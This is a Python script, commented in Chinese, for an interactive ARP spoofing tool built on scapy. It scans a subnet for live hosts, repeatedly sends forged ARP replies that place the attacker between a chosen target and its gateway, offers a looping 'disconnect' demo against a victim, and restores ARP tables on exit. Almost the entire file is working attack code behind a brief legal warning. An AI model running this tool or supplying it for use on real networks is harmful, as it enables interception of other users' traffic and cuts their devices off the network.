#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARP欺骗攻击修复版 - 强制使用Layer 3 socket
解决Npcap驱动检测问题

功能：
1. 完整的ARP欺骗攻击
2. 网络设备扫描
3. 自动恢复功能
"""

import os
import sys
import time
import socket
from scapy.all import ARP, send, conf
from scapy.layers.l2 import arping

class ARPSpoofFixed:
    def __init__(self):
        # 强制使用Layer 3 socket，绕过Npcap依赖
        conf.L3socket = conf.L3socket
        self.is_attacking = False
        
    def scan_network_l3(self, ip_range="192.168.1.0/24"):
        """使用Layer 3扫描网络"""
        print(f"[+] 正在使用Layer 3扫描网络 {ip_range}...")
        
        try:
            # 使用arping进行扫描（Layer 3）
            ans, unans = arping(ip_range, verbose=False, timeout=2)
            
            devices = []
            for sent, received in ans:
                devices.append({
                    'ip': received.psrc, 
                    'mac': received.hwsrc
                })
            
            print(f"[+] 发现 {len(devices)} 个活跃设备:")
            for i, device in enumerate(devices, 1):
                print(f"    {i}. IP: {device['ip']} - MAC: {device['mac']}")
            
            return devices
            
        except Exception as e:
            print(f"[-] 扫描失败: {e}")
            print("[!] 尝试使用ping方式扫描...")
            return self.scan_network_ping(ip_range)
    
    def scan_network_ping(self, ip_range="192.168.1.0/24"):
        """备用方案：使用ping扫描"""
        import subprocess
        
        print(f"[+] 正在使用ping扫描网络 {ip_range}...")
        
        # 提取IP段
        base_ip = ip_range.split('/')[0]
        ip_parts = base_ip.split('.')
        
        active_devices = []
        
        # 扫描前20个IP
        for i in range(1, 21):
            target_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
            
            try:
                # 使用ping检测
                result = subprocess.run(
                    f"ping -n 1 -w 1000 {target_ip}", 
                    shell=True, 
                    capture_output=True, 
                    text=True
                )
                
                if result.returncode == 0 and "TTL=" in result.stdout:
                    # 获取MAC地址
                    mac_result = subprocess.run(
                        f"arp -a {target_ip}", 
                        shell=True, 
                        capture_output=True, 
                        text=True
                    )
                    
                    mac_address = "未知"
                    if mac_result.returncode == 0 and target_ip in mac_result.stdout:
                        for line in mac_result.stdout.split('\n'):
                            if target_ip in line:
                                parts = line.split()
                                if len(parts) >= 2:
                                    mac_address = parts[1]
                                    break
                    
                    active_devices.append({
                        'ip': target_ip,
                        'mac': mac_address,
                        'status': '活跃'
                    })
                    print(f"    [+] 发现设备: {target_ip} - MAC: {mac_address}")
                
                time.sleep(0.1)
                
            except Exception as e:
                continue
        
        print(f"[+] 扫描完成，发现 {len(active_devices)} 个活跃设备")
        return active_devices
    
    def get_mac_l3(self, ip):
        """使用Layer 3获取MAC地址"""
        try:
            ans, unans = arping(ip, verbose=False, timeout=2)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def spoof_l3(self, target_ip, gateway_ip):
        """使用Layer 3进行ARP欺骗"""
        try:
            # 告诉目标：我是网关
            packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
            
            # 告诉网关：我是目标
            packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
            
            # 使用send发送（Layer 3）
            send(packet1, verbose=False)
            send(packet2, verbose=False)
            return True
            
        except Exception as e:
            print(f"[-] ARP欺骗失败: {e}")
            return False
    
    def restore_l3(self, target_ip, gateway_ip):
        """恢复ARP表"""
        try:
            target_mac = self.get_mac_l3(target_ip)
            gateway_mac = self.get_mac_l3(gateway_ip)
            
            if target_mac and gateway_mac:
                # 恢复目标的ARP表
                packet1 = ARP(
                    op=2, pdst=target_ip, hwdst=target_mac, 
                    psrc=gateway_ip, hwsrc=gateway_mac
                )
                
                # 恢复网关的ARP表
                packet2 = ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                    psrc=target_ip, hwsrc=target_mac
                )
                
                send(packet1, count=3, verbose=False)
                send(packet2, count=3, verbose=False)
                print("[+] ARP表已恢复")
        except Exception as e:
            print(f"[-] 恢复失败: {e}")
    
    def start_attack(self, target_ip, gateway_ip, duration=30):
        """开始ARP欺骗攻击"""
        print(f"\n[+] 开始ARP欺骗攻击（Layer 3模式）")
        print(f"    目标IP: {target_ip}")
        print(f"    网关IP: {gateway_ip}")
        print(f"    持续时间: {duration}秒")
        print("    按 Ctrl+C 停止攻击\n")
        
        self.is_attacking = True
        sent_packets = 0
        
        try:
            start_time = time.time()
            
            while self.is_attacking:
                if self.spoof_l3(target_ip, gateway_ip):
                    sent_packets += 2
                    print(f"\r[+] 已发送 {sent_packets} 个ARP欺骗包", end="", flush=True)
                
                if time.time() - start_time > duration:
                    print("\n[+] 攻击时间到，自动停止")
                    break
                    
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[+] 用户中断攻击")
        finally:
            self.stop_attack(target_ip, gateway_ip)
    
    def stop_attack(self, target_ip, gateway_ip):
        """停止攻击并恢复网络"""
        if self.is_attacking:
            print("\n[+] 正在停止攻击并恢复网络...")
            self.is_attacking = False
            self.restore_l3(target_ip, gateway_ip)
            print("[+] 攻击已停止")
    
    def demo_simple(self):
        """极简演示"""
        print("\n=== 极简ARP断网演示（Layer 3） ===")
        
        TARGET_IP = "192.168.1.100"
        GATEWAY_IP = "192.168.1.1"
        
        print(f"目标IP: {TARGET_IP}")
        print(f"网关IP: {GATEWAY_IP}")
        print("按 Ctrl+C 停止演示\n")
        
        packet_count = 0
        try:
            while True:
                arp = ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP)
                send(arp, verbose=False)
                packet_count += 1
                print(f"\r已发送 {packet_count} 个ARP欺骗包", end="", flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n演示结束")

def main():
    """主函数"""
    print("=" * 60)
    print("     ARP欺骗攻击修复版（Layer 3模式）")
    print("     解决Npcap驱动检测问题")
    print("=" * 60)
    
    # 重要警告
    print("\n⚠️  重要警告：")
    print("1. 仅在您拥有完全控制权的测试环境中使用")
    print("2. 未经授权使用属于违法行为")
    
    confirm = input("\n是否继续？(y/N): ").lower()
    if confirm != 'y':
        print("程序已退出")
        return
    
    arp = ARPSpoofFixed()
    
    while True:
        print("\n" + "=" * 40)
        print("1. 网络扫描（Layer 3模式）")
        print("2. 极简ARP断网演示")
        print("3. 完整ARP欺骗攻击")
        print("4. 退出")
        print("=" * 40)
        
        choice = input("请选择功能 (1-4): ").strip()
        
        if choice == '1':
            ip_range = input("输入要扫描的IP段 (默认: 192.168.1.0/24): ") or "192.168.1.0/24"
            arp.scan_network_l3(ip_range)
            
        elif choice == '2':
            arp.demo_simple()
            
        elif choice == '3':
            target_ip = input("输入目标IP: ").strip()
            gateway_ip = input("输入网关IP: ").strip()
            duration = input("输入攻击持续时间(秒，默认30): ").strip()
            
            if not duration:
                duration = 30
            else:
                duration = int(duration)
            
            if target_ip and gateway_ip:
                arp.start_attack(target_ip, gateway_ip, duration)
            else:
                print("[-] IP地址不能为空")
                
        elif choice == '4':
            print("程序已退出")
            break
            
        else:
            print("[-] 无效选择")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n程序被用户中断")
    except Exception as e:
        print(f"\n[-] 程序出错: {e}")